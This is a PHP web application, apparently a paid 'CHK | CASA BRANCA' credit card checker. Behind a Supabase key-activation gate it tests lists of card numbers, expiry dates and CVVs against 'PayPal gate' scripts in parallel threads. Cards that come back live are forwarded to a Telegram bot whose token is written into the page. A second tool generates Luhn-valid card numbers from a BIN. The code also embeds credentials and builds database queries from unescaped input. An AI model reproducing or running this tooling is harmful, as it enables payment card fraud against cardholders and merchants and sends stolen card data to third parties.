<?php
session_start();

// ============ CONFIGURAÇÕES DO SUPABASE ============
define('SUPABASE_URL', 'https://lhsnuricdmdoiwsilvxm.supabase.co');
define('SUPABASE_KEY', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imxoc251cmljZG1kb2l3c2lsdnhtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUzMzkyMjIsImV4cCI6MjA5MDkxNTIyMn0.DZX6YTYz9lz4yT5P9cyDCcXPwe-id7QFbGp4HKnhfmM');

function supabaseRequest($method, $endpoint, $data = null) {
    $url = SUPABASE_URL . '/rest/v1/' . $endpoint;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'apikey: ' . SUPABASE_KEY,
        'Authorization: Bearer ' . SUPABASE_KEY,
        'Content-Type: application/json'
    ]);
    
    if ($data) {
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    }
    
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

// ============ PROCESSAR ATIVAÇÃO ============
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH'])) {
    header('Content-Type: application/json');
    $input = json_decode(file_get_contents('php://input'), true);
    $key = strtoupper(trim($input['key'] ?? ''));
    
    $result = supabaseRequest('GET', "keys?key=eq.{$key}&select=*");
    
    if (!$result || empty($result)) {
        echo json_encode(['success' => false, 'message' => 'KEY INVÁLIDA!']);
        exit;
    }
    
    $row = $result[0];
    
    if ($row['status'] != 'active') {
        echo json_encode(['success' => false, 'message' => 'KEY JÁ UTILIZADA!']);
        exit;
    }
    
    if (strtotime($row['expires_at']) < time()) {
        echo json_encode(['success' => false, 'message' => 'KEY EXPIRADA!']);
        exit;
    }
    
    supabaseRequest('PATCH', "keys?key=eq.{$key}", [
        'status' => 'used',
        'used_at' => date('Y-m-d H:i:s')
    ]);
    
    $_SESSION['activated_key'] = $key;
    $_SESSION['expires_at'] = $row['expires_at'];
    
    echo json_encode(['success' => true, 'message' => 'KEY ATIVADA COM SUCESSO!']);
    exit;
}

// ============ PROCESSAR CHECKER ============
if (isset($_GET['action']) && $_GET['action'] == 'check') {
    header('Content-Type: text/plain; charset=utf-8');
    $lista = $_GET['lista'] ?? '';
    $api = $_GET['api'] ?? 'paypal1.php';
    
    if (empty($lista)) {
        echo "❌ Lista vazia";
        exit;
    }
    
    $url = $api . '?lista=' . urlencode($lista);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = curl_exec($ch);
    curl_close($ch);
    
    echo $response;
    exit;
}

// ============ VERIFICAR SESSÃO ============
$is_activated = false;
$key_info = null;

if (isset($_SESSION['activated_key'])) {
    $key = $_SESSION['activated_key'];
    $result = supabaseRequest('GET', "keys?key=eq.{$key}&select=expires_at");
    
    if ($result && !empty($result) && strtotime($result[0]['expires_at']) > time()) {
        $is_activated = true;
        $key_info = [
            'key' => $key,
            'expires_at' => date('d/m/Y H:i', strtotime($result[0]['expires_at']))
        ];
    } else {
        session_destroy();
    }
}

// ============ PÁGINA DE BLOQUEIO ============
if (!$is_activated) {
    $foto_base64 = '';
    if (file_exists('fundo.jpg')) {
        $foto_data = file_get_contents('fundo.jpg');
        $foto_base64 = 'data:image/jpeg;base64,' . base64_encode($foto_data);
    }
    ?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CHK | CASA BRANCA</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #000000 0%, #1a0000 100%);
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow: hidden;
        }
        body::before {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at center, rgba(255,0,0,0.1) 0%, transparent 70%);
            animation: pulse 4s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 0.6; }
        }
        .container { width: 100%; max-width: 450px; padding: 20px; position: relative; z-index: 1; }
        .lock-card {
            background: rgba(5, 5, 5, 0.95);
            border: 2px solid #ff0000;
            border-radius: 30px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
            backdrop-filter: blur(10px);
            animation: borderGlow 2s ease-in-out infinite alternate;
        }
        @keyframes borderGlow {
            from { box-shadow: 0 0 20px rgba(255, 0, 0, 0.3); border-color: #ff0000; }
            to { box-shadow: 0 0 50px rgba(255, 0, 0, 0.6); border-color: #ff4444; }
        }
        .logo-img {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            margin-bottom: 20px;
            border: 3px solid #ff0000;
            object-fit: cover;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
            transition: transform 0.3s;
        }
        .title {
            color: #ff0000;
            font-size: 1.8rem;
            font-weight: bold;
            letter-spacing: 3px;
            margin-bottom: 8px;
            text-shadow: 0 0 15px #ff0000;
        }
        .subtitle {
            color: #ff6666;
            font-size: 0.7rem;
            margin-bottom: 35px;
            border-bottom: 1px solid rgba(255,0,0,0.3);
            padding-bottom: 15px;
        }
        .key-input {
            width: 100%;
            padding: 15px;
            background: rgba(0,0,0,0.8);
            border: 2px solid #333;
            color: #ff0000;
            font-size: 1.2rem;
            text-align: center;
            letter-spacing: 3px;
            font-family: monospace;
            border-radius: 50px;
            transition: all 0.3s;
        }
        .key-input:focus {
            border-color: #ff0000;
            outline: none;
            box-shadow: 0 0 25px rgba(255, 0, 0, 0.4);
        }
        .activate-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #ff0000, #cc0000);
            color: #000;
            border: none;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            border-radius: 50px;
            margin-top: 25px;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .activate-btn:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.6);
        }
        .message {
            margin-top: 20px;
            padding: 12px;
            border-radius: 25px;
            display: none;
            font-size: 0.8rem;
        }
        .message.error {
            background: rgba(255, 0, 0, 0.15);
            border: 1px solid #ff0000;
            color: #ff6666;
            display: block;
        }
        .message.success {
            background: rgba(255, 0, 0, 0.15);
            border: 1px solid #ff0000;
            color: #ff0000;
            display: block;
        }
        .footer {
            margin-top: 30px;
            color: #444;
            font-size: 0.6rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="lock-card">
            <img src="<?php echo $foto_base64 ?: 'https://via.placeholder.com/120?text=CB'; ?>" class="logo-img" alt="CASA BRANCA">
            <div class="title">CHK | CASA BRANCA</div>
            <div class="subtitle">✦ SISTEMA DE ATIVAÇÃO ✦</div>
            
            <input type="text" class="key-input" id="activationKey" placeholder="XXXX-XXXX" maxlength="9" oninput="formatKey(this)">
            
            <button class="activate-btn" onclick="activateKey()">⚡ ATIVAR ACESSO ⚡</button>
            
            <div id="message" class="message"></div>
            
            <div class="footer">🔥 criador: @suppys7 🔥</div>
        </div>
    </div>
    
    <script>
        function formatKey(input) {
            let value = input.value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
            if (value.length > 4) {
                value = value.substring(0,4) + '-' + value.substring(4,8);
            }
            input.value = value;
        }
        
        async function activateKey() {
            const key = document.getElementById('activationKey').value;
            const messageDiv = document.getElementById('message');
            
            if (!key || key.length < 9) {
                messageDiv.className = 'message error';
                messageDiv.innerHTML = '❌ KEY INVÁLIDA! Formato: XXXX-XXXX';
                return;
            }
            
            messageDiv.className = 'message';
            messageDiv.innerHTML = '🔄 VERIFICANDO KEY...';
            messageDiv.style.display = 'block';
            
            try {
                const response = await fetch('/', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest'},
                    body: JSON.stringify({key: key})
                });
                
                const data = await response.json();
                
                if (data.success) {
                    messageDiv.className = 'message success';
                    messageDiv.innerHTML = '✅ ' + data.message;
                    setTimeout(() => {
                        window.location.reload();
                    }, 1500);
                } else {
                    messageDiv.className = 'message error';
                    messageDiv.innerHTML = '❌ ' + data.message;
                }
            } catch (error) {
                messageDiv.className = 'message error';
                messageDiv.innerHTML = '❌ ERRO DE CONEXÃO! Tente novamente.';
            }
        }
    </script>
</body>
</html>
    <?php
    exit;
}

// ============ DASHBOARD PRINCIPAL ============
$foto_base64 = '';
if (file_exists('fundo.jpg')) {
    $foto_data = file_get_contents('fundo.jpg');
    $foto_base64 = 'data:image/jpeg;base64,' . base64_encode($foto_data);
}
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CHK | CASA BRANCA</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', monospace; }
        body { background: linear-gradient(135deg, #0a0a0a 0%, #1a0000 100%); color: #ff0000; padding: 20px; min-height: 100vh; }
        .container { max-width: 800px; margin: 0 auto; }
        .header { text-align: center; padding: 25px; border-bottom: 2px solid #ff0000; margin-bottom: 20px; border-radius: 30px 30px 0 0; background: rgba(0,0,0,0.3); }
        .header h1 { font-size: 1.5rem; letter-spacing: 4px; color: #ff0000; text-shadow: 0 0 15px #ff0000; animation: neonPulse 1.5s ease-in-out infinite alternate; }
        @keyframes neonPulse { from { text-shadow: 0 0 5px #ff0000; } to { text-shadow: 0 0 20px #ff0000; } }
        .user-info { text-align: right; margin-bottom: 20px; padding: 12px 18px; background: rgba(17,17,17,0.9); border-radius: 50px; font-size: 0.7rem; border: 1px solid #ff0000; }
        .nav { display: flex; gap: 12px; margin-bottom: 20px; }
        .nav-btn { flex: 1; padding: 14px; background: rgba(26,26,26,0.9); border: 1px solid #333; color: #fff; cursor: pointer; font-weight: bold; border-radius: 50px; transition: all 0.3s; }
        .nav-btn.active { background: #ff0000; color: #000; border-color: #ff0000; box-shadow: 0 0 20px rgba(255,0,0,0.3); }
        .page { display: none; }
        .page.active { display: block; animation: fadeIn 0.5s; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .card { background: rgba(17,17,17,0.9); border: 1px solid #333; padding: 25px; margin-bottom: 20px; border-radius: 25px; transition: all 0.3s; }
        .card:hover { border-color: #ff0000; box-shadow: 0 0 15px rgba(255,0,0,0.1); }
        label { font-size: 0.7rem; color: #ff6666; display: block; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1px; }
        input, select, textarea { width: 100%; padding: 14px; background: #000; border: 1px solid #333; color: #ff0000; margin-bottom: 15px; border-radius: 15px; transition: all 0.3s; }
        input:focus, select:focus, textarea:focus { border-color: #ff0000; outline: none; box-shadow: 0 0 10px rgba(255,0,0,0.2); }
        .btn-group { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
        .btn { padding: 15px; border: none; font-weight: bold; cursor: pointer; font-size: 0.9rem; border-radius: 50px; transition: all 0.3s; }
        .btn-start { background: linear-gradient(135deg, #ff0000, #cc0000); color: #000; box-shadow: 0 0 15px rgba(255,0,0,0.3); }
        .btn-start:hover { transform: scale(1.02); box-shadow: 0 0 25px rgba(255,0,0,0.5); }
        .btn-stop { background: #660000; color: #fff; }
        .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; padding: 20px; background: rgba(17,17,17,0.9); border: 1px solid #333; margin-bottom: 20px; border-radius: 25px; text-align: center; }
        .stat-label { font-size: 0.6rem; color: #ff6666; display: block; margin-bottom: 5px; }
        .stat-val { font-size: 1.3rem; font-weight: bold; display: block; margin-top: 5px; color: #ff0000; text-shadow: 0 0 5px rgba(255,0,0,0.3); }
        .box { background: #000; border: 1px solid #333; height: 200px; overflow-y: auto; padding: 12px; font-size: 0.7rem; border-radius: 20px; }
        .item-live { border-left: 3px solid #ff0000; color: #ff0000; padding: 8px; margin-bottom: 6px; border-radius: 10px; background: rgba(255,0,0,0.05); }
        .item-die { border-left: 3px solid #660000; color: #ff6666; padding: 8px; margin-bottom: 6px; border-radius: 10px; background: rgba(102,0,0,0.05); }
        .action-btn { background: rgba(26,26,26,0.9); border: 1px solid #ff0000; color: #ff0000; padding: 6px 14px; cursor: pointer; font-size: 0.7rem; border-radius: 20px; transition: all 0.3s; }
        .action-btn:hover { background: #ff0000; color: #000; box-shadow: 0 0 10px rgba(255,0,0,0.3); }
        .logout-btn { background: #660000; color: #fff; border: none; padding: 6px 14px; cursor: pointer; margin-left: 12px; border-radius: 20px; }
        footer { text-align: center; padding: 20px; color: #444; font-size: 0.7rem; }
        textarea { font-family: monospace; resize: vertical; }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #1a1a1a; border-radius: 10px; }
        ::-webkit-scrollbar-thumb { background: #ff0000; border-radius: 10px; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>⚡ CHK | CASA BRANCA ⚡</h1>
        <p style="color: #ff6666; margin-top: 5px;">PAYPAL GATEWAY SYSTEM</p>
    </div>
    
    <div class="user-info">
        <span>✅ ATIVADO: <?php echo $key_info['key']; ?></span>
        <span style="margin-left: 15px;">⏰ EXPIRA: <?php echo $key_info['expires_at']; ?></span>
        <button class="logout-btn" onclick="logout()">🚪 SAIR</button>
    </div>
    
    <div class="nav">
        <button class="nav-btn active" onclick="showPage('checker', this)">🔍 CHECKER</button>
        <button class="nav-btn" onclick="showPage('gerador', this)">🎲 GERADOR</button>
    </div>
    
    <div id="page-checker" class="page active">
        <div class="card">
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                <div>
                    <label>🎮 GATEWAY</label>
                    <select id="api_selector">
                        <option value="paypal1.php">PAYPAL GATE 1</option>
                        <option value="paypal2.php">PAYPAL GATE 2</option>
                    </select>
                </div>
                <div>
                    <label>⚡ THREADS</label>
                    <select id="thread_selector">
                        <option value="2">2 THREADS</option>
                        <option value="4">4 THREADS</option>
                        <option value="8">8 THREADS</option>
                    </select>
                </div>
            </div>
            <label>📱 TELEGRAM ID (LIVES)</label>
            <input type="text" id="user_tg_id" placeholder="Ex: 12345678" value="8309449775">
        </div>
        
        <div class="btn-group">
            <button class="btn btn-start" onclick="start()" id="btnStart">▶ INICIAR</button>
            <button class="btn btn-stop" onclick="stop()" id="btnStop" disabled>⏹ PARAR</button>
        </div>
        
        <div class="stats">
            <div class="stat-item"><span class="stat-label">📊 CARREGADAS</span><span class="stat-val" id="totalCount">0</span></div>
            <div class="stat-item"><span class="stat-label">🔄 TESTADAS</span><span class="stat-val" id="testadasCount">0</span></div>
            <div class="stat-item"><span class="stat-label">✅ APROVADAS</span><span class="stat-val" id="liveCountStat">0</span></div>
            <div class="stat-item"><span class="stat-label">❌ REPROVADAS</span><span class="stat-val" id="dieCountStat">0</span></div>
        </div>
        
        <textarea id="lista_input" rows="6" placeholder="CC|MES|ANO|CVV&#10;Ex: 4571731234567890|12|2028|123" oninput="updateTotal()"></textarea>
        
        <div class="card">
            <div style="display: flex; justify-content: space-between; margin-bottom: 12px;">
                <label>✅ APROVADAS</label>
                <button class="action-btn" onclick="copyList('live_list')">📋 COPIAR</button>
            </div>
            <div id="live_list" class="box"></div>
        </div>
        
        <div class="card">
            <div style="display: flex; justify-content: space-between; margin-bottom: 12px;">
                <label>❌ REPROVADAS</label>
                <button class="action-btn" onclick="clearDie()">🗑 LIMPAR</button>
            </div>
            <div id="die_list" class="box"></div>
        </div>
    </div>
    
    <div id="page-gerador" class="page">
        <div class="card">
            <label>🔢 BIN/MATRIX</label>
            <input type="text" id="gen_bin" placeholder="Ex: 457173" maxlength="16">
            <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px;">
                <div>
                    <label>📅 MÊS</label>
                    <select id="gen_mes">
                        <option value="rnd">🎲 RANDOM</option>
                        <option value="01">01</option><option value="02">02</option>
                        <option value="03">03</option><option value="04">04</option>
                        <option value="05">05</option><option value="06">06</option>
                        <option value="07">07</option><option value="08">08</option>
                        <option value="09">09</option><option value="10">10</option>
                        <option value="11">11</option><option value="12">12</option>
                    </select>
                </div>
                <div>
                    <label>📅 ANO</label>
                    <select id="gen_ano">
                        <option value="rnd">🎲 RANDOM</option>
                        <option value="2026">2026</option><option value="2027">2027</option>
                        <option value="2028">2028</option><option value="2029">2029</option>
                        <option value="2030">2030</option><option value="2031">2031</option>
                        <option value="2032">2032</option><option value="2033">2033</option>
                        <option value="2034">2034</option>
                    </select>
                </div>
                <div>
                    <label>🔐 CVV</label>
                    <input type="text" id="gen_cvv" value="rnd">
                </div>
            </div>
            <label>🔢 QUANTIDADE</label>
            <input type="number" id="gen_quant" value="10" min="1">
            <button class="btn btn-start" style="width:100%; margin-top:15px" onclick="generate()">✨ GERAR CARDS ✨</button>
        </div>
        <div class="card">
            <textarea id="gen_out" rows="8" readonly placeholder="Cards gerados..."></textarea>
            <button class="action-btn" style="width:100%; margin-top:12px" onclick="copyGen()">📋 COPIAR TUDO</button>
        </div>
    </div>
    
    <footer>🔥 criador: @suppys7 | CASA BRANCA | PayPal System 🔥</footer>
</div>

<script>
    let isRunning = false;
    let currentQueue = [];
    let totalCards = 0;
    let testedCards = 0;
    let liveCards = 0;
    let dieCards = 0;
    
    function showPage(page, btn) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
        document.getElementById('page-' + page).classList.add('active');
        btn.classList.add('active');
    }
    
    function updateTotal() {
        const text = document.getElementById('lista_input').value;
        const lines = text.split('\n').filter(l => l.trim().length > 5);
        document.getElementById('totalCount').innerText = lines.length;
        totalCards = lines.length;
    }
    
    async function start() {
        const lista = document.getElementById('lista_input').value;
        if (!lista.trim()) {
            alert('⚠️ Lista vazia!');
            return;
        }
        
        const lines = lista.split('\n').filter(l => l.trim().length > 5);
        totalCards = lines.length;
        testedCards = 0;
        liveCards = 0;
        dieCards = 0;
        currentQueue = [...lines];
        
        document.getElementById('live_list').innerHTML = '';
        document.getElementById('die_list').innerHTML = '';
        document.getElementById('totalCount').innerText = totalCards;
        document.getElementById('testadasCount').innerText = '0';
        document.getElementById('liveCountStat').innerText = '0';
        document.getElementById('dieCountStat').innerText = '0';
        
        isRunning = true;
        document.getElementById('btnStart').disabled = true;
        document.getElementById('btnStop').disabled = false;
        
        const api = document.getElementById('api_selector').value;
        const threads = parseInt(document.getElementById('thread_selector').value);
        
        for (let i = 0; i < threads; i++) {
            runThread(api);
        }
    }
    
    async function runThread(api) {
        while (isRunning && currentQueue.length > 0) {
            const item = currentQueue.shift();
            if (item) {
                await processItem(item, api);
            }
        }
    }
    
    async function processItem(line, api) {
        try {
            const response = await fetch(`?action=check&api=${encodeURIComponent(api)}&lista=${encodeURIComponent(line)}`);
            const result = await response.text();
            
            const isLive = result.includes('✅') || result.includes('APROVADA') || result.includes('LIVE');
            
            if (isLive) {
                liveCards++;
                addResult(result, true);
                const telegramId = document.getElementById('user_tg_id').value;
                if (telegramId && telegramId.length > 5) {
                    fetch(`https://api.telegram.org/bot8551255392:AAEwXi_cXDIWESAQ8GGwC1Q3m7-yEmyDMZ4/sendMessage?chat_id=${telegramId}&text=${encodeURIComponent(result.substring(0, 500))}`);
                }
            } else {
                dieCards++;
                addResult(result, false);
            }
            
            testedCards++;
            updateStatsDisplay();
            
            if (testedCards >= totalCards) {
                stop();
            }
        } catch(e) {
            console.error(e);
            addResult('❌ ERRO: ' + e.message, false);
            testedCards++;
            updateStatsDisplay();
        }
    }
    
    function addResult(msg, isLive) {
        const div = document.createElement('div');
        div.className = isLive ? 'item-live' : 'item-die';
        div.innerHTML = (isLive ? '✅ ' : '❌ ') + msg.replace(/<br>/g, ' ').substring(0, 200);
        const box = document.getElementById(isLive ? 'live_list' : 'die_list');
        box.insertBefore(div, box.firstChild);
    }
    
    function updateStatsDisplay() {
        document.getElementById('testadasCount').innerText = testedCards;
        document.getElementById('liveCountStat').innerText = liveCards;
        document.getElementById('dieCountStat').innerText = dieCards;
    }
    
    function stop() {
        isRunning = false;
        document.getElementById('btnStart').disabled = false;
        document.getElementById('btnStop').disabled = true;
    }
    
    function clearDie() {
        document.getElementById('die_list').innerHTML = '';
        dieCards = 0;
        document.getElementById('dieCountStat').innerText = '0';
    }
    
    function copyList(id) {
        const el = document.getElementById(id);
        const text = Array.from(el.children).map(c => c.innerText.replace(/^✅|❌/g, '').trim()).join('\n');
        navigator.clipboard.writeText(text).then(() => alert('📋 Copiado!'));
    }
    
    function copyGen() {
        const text = document.getElementById('gen_out').value;
        navigator.clipboard.writeText(text).then(() => alert('📋 Copiado!'));
    }
    
    function logout() {
        window.location.href = '?logout=1';
    }
    
    function getLuhn(str) {
        let sum = 0, double = true;
        for (let i = str.length - 1; i >= 0; i--) {
            let digit = parseInt(str.charAt(i));
            if (double) { digit *= 2; if (digit > 9) digit -= 9; }
            sum += digit;
            double = !double;
        }
        return (sum * 9) % 10;
    }
    
    function generate() {
        let binRaw = document.getElementById('gen_bin').value.replace(/[^\d]/g, '');
        if (binRaw.length < 6) {
            alert('⚠️ BIN inválida! Mínimo 6 dígitos');
            return;
        }
        
        let isAmex = binRaw.startsWith('34') || binRaw.startsWith('37');
        let ccLen = isAmex ? 15 : 16;
        let cvvLen = isAmex ? 4 : 3;
        let res = '';
        let quant = parseInt(document.getElementById('gen_quant').value);
        
        for (let i = 0; i < quant; i++) {
            let cc = binRaw;
            while (cc.length < ccLen - 1) cc += Math.floor(Math.random() * 10);
            cc += getLuhn(cc);
            
            let m = document.getElementById('gen_mes').value;
            let mm = m === 'rnd' ? ('0' + (Math.floor(Math.random() * 12) + 1)).slice(-2) : m;
            
            let a = document.getElementById('gen_ano').value;
            let aa = a === 'rnd' ? Math.floor(Math.random() * (2034 - 2026) + 2026) : a;
            
            let cv = document.getElementById('gen_cvv').value;
            let cvv = cv === 'rnd' ? Array.from({length: cvvLen}, () => Math.floor(Math.random() * 10)).join('') : cv.substring(0, cvvLen);
            
            res += `${cc}|${mm}|${aa}|${cvv}\n`;
        }
        document.getElementById('gen_out').value = res;
    }
    
    updateTotal();
</script>
</body>
</html>
<?php
// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: /');
    exit;
}
?>